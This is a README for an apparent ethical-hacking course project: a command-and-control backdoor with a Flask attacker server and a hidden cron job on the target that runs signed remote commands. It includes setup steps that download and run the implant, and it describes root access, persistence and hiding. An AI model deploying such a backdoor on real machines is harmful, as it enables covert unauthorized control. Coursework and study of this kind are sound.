# Command-Control

## CS378 Ethical Hacking - Command and Control

David Trakhtengerts : dst726 and Ricky Woodruff : rgw664

## Install

### Attack Machine

1. Install dependencies

    ```bash
    pip3 install -r requirements.txt
    ```
2. Generate a key pair
    
    Keys should be in the same directory as the server

    ```bash
    openssl genrsa -out private.pem 1024
    openssl rsa -in private.pem -pubout -out public.pem
    ```
3. Run the flask server

    ```bash
    export FLASK_APP=attacker-server.py
    flask run --host={Server IP}
    ```


### Target Machine

1. Copy over public key to target machine from the attacker machine

    ```bash
    scp public.pem {Target IP}:~/ 
    # Example: scp public.pem user@10.0.2.5
    ```

2. Run the target script

    ```bash
    curl -L http://github.com/woodruffr4/Command-Control/archive/main.tar.gz | tar zxf -
    cd Command-Control-main
    chmod +x setup.sh
    ./setup.sh {Your Server Endpoint}
    # Example: ./setup.sh http://10.0.2.4:5000/commands
    ```



## How it works

There are two parts to this backdoor, the flask server on the attacker side and the cron job on the target side.

### Cron job

The cron job runs every minute and calls a python script which makes a request to the `/commands` endpoint on the flask server. The server responds a signature and commands to run. The signature will be verified using the public key and if it is valid, the commands will be run. The output of the commands is sent to a log file on the target machine.

### Flask Server

The flask server has one endpoint, `/commands`. This endpoint is used to send commands to the target machine.
The server reads the commands from a file `commands.txt`, and deletes the contents after (to avoid re executing commands). It then signs the commands with a private key, and sends the signature along with the commands to the target machine.


## How it meets the requirements

1. Provide remote root shell access
    - The attacker can write commands in a file on a machine and the target machine will execute those commands.
2. Persistence
    - The target machine can reboot and this backdoor will persist automatically because by deault cron jobs are run on boot.
3. Configuration
    - The attacker can add commands to the file on their machine.
    - The attacker can configure the server ip and port where the commands come from.
4. Authentication
    - The attacker and target machines use a public/private key pair to authenticate each other.
    - Only the attacker who created the key pair will be able to send commands to the target machine.
5. Hiding
    - Cron job is only visible to root users
    - The script is hidden by a period in front of the file name

## Detection

- At the user level there is no way to detect this backdoor because users do not have access to the cron directory.
- Root users can see the cron job, .cron.py (if they look closely), and the log file.